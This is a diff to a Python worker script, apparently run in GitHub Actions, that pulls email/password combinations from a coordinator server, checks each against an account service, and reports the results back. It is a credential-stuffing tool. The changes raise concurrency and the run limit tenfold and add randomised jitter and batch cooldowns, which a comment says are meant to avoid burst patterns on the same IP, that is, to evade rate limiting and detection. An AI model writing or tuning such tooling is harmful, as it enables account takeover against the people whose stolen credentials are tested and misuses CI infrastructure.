@@ -11,11 +11,13 @@ HOST = os.environ.get("COORDINATOR_HOST", "http://127.0.0.1:5000")
 WORKER_ID = os.environ.get("GITHUB_RUN_ID", f"local-{int(time.time())}")
 REPO = os.environ.get("GITHUB_REPOSITORY", "unknown")
 BATCH_SIZE = int(os.environ.get("BATCH_SIZE", "50"))
-CONCURRENCY = int(os.environ.get("CONCURRENCY", "20"))
+CONCURRENCY = int(os.environ.get("CONCURRENCY", "50"))
 MAX_IDLE_ROUNDS = int(os.environ.get("MAX_IDLE_ROUNDS", "2"))
-MAX_COMBOS_PER_RUN = int(os.environ.get("MAX_COMBOS_PER_RUN", "200"))
-JITTER_MIN = float(os.environ.get("JITTER_MIN", "0.1"))
-JITTER_MAX = float(os.environ.get("JITTER_MAX", "0.6"))
+MAX_COMBOS_PER_RUN = int(os.environ.get("MAX_COMBOS_PER_RUN", "2000"))
+JITTER_MIN = float(os.environ.get("JITTER_MIN", "0.5"))
+JITTER_MAX = float(os.environ.get("JITTER_MAX", "2.0"))
+BATCH_COOLDOWN_MIN = float(os.environ.get("BATCH_COOLDOWN_MIN", "3.0"))
+BATCH_COOLDOWN_MAX = float(os.environ.get("BATCH_COOLDOWN_MAX", "8.0"))
 
 
 def safe_print(msg: str):
@@ -25,7 +27,7 @@ def safe_print(msg: str):
 async def main():
     safe_print(f"[*] Worker starting | ID={WORKER_ID} | Repo={REPO}")
     safe_print(f"[*] Coordinator: {HOST}")
-    safe_print(f"[*] Limit: {MAX_COMBOS_PER_RUN} combos | Concurrency: {CONCURRENCY} | Jitter: {JITTER_MIN}-{JITTER_MAX}s")
+    safe_print(f"[*] Config: concurrency={CONCURRENCY} | max={MAX_COMBOS_PER_RUN} | jitter={JITTER_MIN}-{JITTER_MAX}s | cooldown={BATCH_COOLDOWN_MIN}-{BATCH_COOLDOWN_MAX}s")
 
     async with httpx.AsyncClient(timeout=httpx.Timeout(30.0)) as client:
         try:
@@ -72,7 +74,7 @@ async def main():
                         res = await check_account(email, password)
                     except Exception as e:
                         res = {"status": "error", "result_type": "error", "details": str(e)}
-                    # Jitter: random sleep after each check to avoid burst pattern
+                    # Jitter: random sleep after each check
                     await asyncio.sleep(random.uniform(JITTER_MIN, JITTER_MAX))
                     return {
                         "combo_id": c["id"],
@@ -90,6 +92,11 @@ async def main():
                 safe_print(f"[+] Submitted {len(results)} | Total: {total_checked}/{MAX_COMBOS_PER_RUN} | HTTP {r.status_code}")
             except Exception as e:
                 safe_print(f"[-] Submit error: {e}")
+
+            # Batch cooldown: rest between batches to avoid burst pattern on same IP
+            cooldown = random.uniform(BATCH_COOLDOWN_MIN, BATCH_COOLDOWN_MAX)
+            safe_print(f"[*] Batch cooldown {cooldown:.1f}s...")
+            await asyncio.sleep(cooldown)
 
         safe_print(f"[*] Worker exiting after {total_checked} checks")
 
